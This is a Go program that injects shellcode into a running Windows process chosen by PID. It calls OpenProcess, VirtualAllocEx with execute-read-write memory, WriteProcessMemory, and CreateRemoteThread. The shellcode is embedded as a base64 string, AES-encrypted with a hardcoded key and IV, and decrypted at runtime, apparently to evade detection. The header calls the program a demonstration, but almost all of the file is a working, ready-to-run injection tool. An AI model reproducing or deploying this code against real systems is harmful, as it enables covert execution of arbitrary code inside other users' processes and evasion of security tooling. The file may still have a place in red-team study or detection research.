// shellcode_injection.go injects shellcode payloads into a specified process using direct Windows API calls,
// demonstrating methods for memory allocation, process manipulation, and remote thread creation

package main

import (
	"crypto/aes"
	"crypto/cipher"
	"encoding/base64"
	"fmt"
	"os"
	"strconv"
	"syscall"
	"unsafe"
)

const (
	PROCESS_ALL_ACCESS     = 0x1F0FFF
	MEM_COMMIT             = 0x1000
	MEM_RESERVE            = 0x2000
	PAGE_EXECUTE_READWRITE = 0x40
)

var (
	kernel32           = syscall.MustLoadDLL("kernel32.dll")
	openProcess        = kernel32.MustFindProc("OpenProcess")
	virtualAllocEx     = kernel32.MustFindProc("VirtualAllocEx")
	writeProcessMemory = kernel32.MustFindProc("WriteProcessMemory")
	createRemoteThread = kernel32.MustFindProc("CreateRemoteThread")
)

func main() {
	var (
		rBuffer  uintptr
		dwPID    int
		hProcess uintptr
		hThread  uintptr
	)

	if len(os.Args) < 2 {
		fmt.Println("[-] usage:", os.Args[0], "<PID>")
		return
	}

	dwPID, _ = strconv.Atoi(os.Args[1])
	fmt.Printf("[*] trying to get a handle to the process (%d)\n", dwPID)

	hProcess, _, err := openProcess.Call(ptr(PROCESS_ALL_ACCESS), ptr(false), ptr(dwPID))
	if hProcess == 0 {
		fmt.Printf("[-] failed to get a handle to the process, error: %v - %d\n", err, err)
		return
	}

	fmt.Printf("[+] got a handle to the process\n\\---0x%x\n", hProcess)

	rBuffer, _, err = virtualAllocEx.Call(hProcess, 0, uintptr(len(payload)), MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE)
	if rBuffer == 0 {
		fmt.Printf("[-] failed to allocate memory in process, error: %v\n", err)
		return
	}

	fmt.Printf("[+] allocated %d bytes to the process memory w/ PAGE_EXECUTE_READWRITE permissions\n", len(payload))

	shellcode, err := decryptShellcode(payload)
	if err != nil {
		fmt.Printf("[-] failed to decrypt shellcode, error: %v\n", err)
		return
	}

	writeResult, _, errWrite := writeProcessMemory.Call(hProcess, rBuffer, uintptr(unsafe.Pointer(&shellcode[0])), uintptr(len(shellcode)), 0)
	if writeResult == 0 {
		fmt.Printf("[-] failed to write shellcode to process memory, error: %v\n", errWrite)
		return
	}

	fmt.Printf("[+] wrote shellcode to process memory\n")

	hThread, _, err = createRemoteThread.Call(hProcess, 0, 0, rBuffer, 0, 0, 0)
	if hThread == 0 {
		fmt.Printf("[-] failed to get a handle to the new thread, error: %v\n", err)
		return
	}

	fmt.Printf("[+] got a handle to the newly-created thread\n\\---0x%x\n", hThread)

	fmt.Printf("[*] waiting for thread to finish executing\n")
	syscall.WaitForSingleObject(syscall.Handle(hThread), syscall.INFINITE)
	fmt.Printf("[+] thread finished executing, cleaning up\n")

	syscall.CloseHandle(syscall.Handle(hThread))
	syscall.CloseHandle(syscall.Handle(hProcess))
	fmt.Printf("[+] finished ദ്ദി( • ᴗ - ) ✧\n")
}

func decryptShellcode(encodedCipherText []byte) ([]byte, error) {
	cipherText := make([]byte, base64.StdEncoding.DecodedLen(len(encodedCipherText)))
	n, err := base64.StdEncoding.Decode(cipherText, encodedCipherText)
	if err != nil {
		return nil, err
	}
	cipherText = cipherText[:n]

	key := []byte("supersecretkey12")
	iv := []byte("16byteivstring12")

	block, err := aes.NewCipher(key)
	if err != nil {
		return nil, err
	}

	mode := cipher.NewCBCDecrypter(block, iv)

	decrypted := make([]byte, len(cipherText))
	mode.CryptBlocks(decrypted, cipherText)

	padLen := int(decrypted[len(decrypted)-1])
	if padLen > aes.BlockSize || padLen > len(decrypted) {
		return nil, fmt.Errorf("invalid padding length")
	}
	return decrypted[:len(decrypted)-padLen], nil
}

func ptr(val interface{}) uintptr {
	switch val.(type) {
	case string:
		pointerValue, _ := syscall.UTF16FromString(val.(string))
		return uintptr(unsafe.Pointer(&pointerValue[0]))
	case int:
		return uintptr(val.(int))
	default:
		return uintptr(0)
	}
}

// Enter base64 encoded, AES encrypted payload, generated with utility_scripts/payload_encryption_aes.go
var payload = []byte("MSbKpvMDc62w4BdhcXkAiri0+9hrpKGGtntRgDqiPCEeSDoePLHEHYIHKMj0c0xCUPgUksXhuiOAmvTFY5/f7yHnOv6r4+SAvRahyPtJDVTbAR0QHy5Mmv9MH9Y27L3FuSAuG1orYKr1RO56EDBs7gMRWt67PsBhcGoerNhM3v+G9m2sjupQF1j/7MtFNVMPyTW5M4KvAYpt2MZiIwyEQPQGrKmMnuXqG5kOANiTKjIJdmmEvqkfoyOFUeEC8PzNQnhQqlybafG1tP1bdGotNQ==")
